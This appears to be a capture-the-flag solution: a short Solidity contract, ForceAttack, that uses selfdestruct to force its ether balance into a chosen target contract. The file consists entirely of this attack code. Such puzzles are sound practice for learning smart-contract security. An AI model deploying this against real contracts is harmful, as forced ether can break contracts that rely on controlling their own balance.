//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract ForceAttack {
  receive() payable external{}
  function attack(address payable _target) public payable {
    selfdestruct(_target);
  }
}
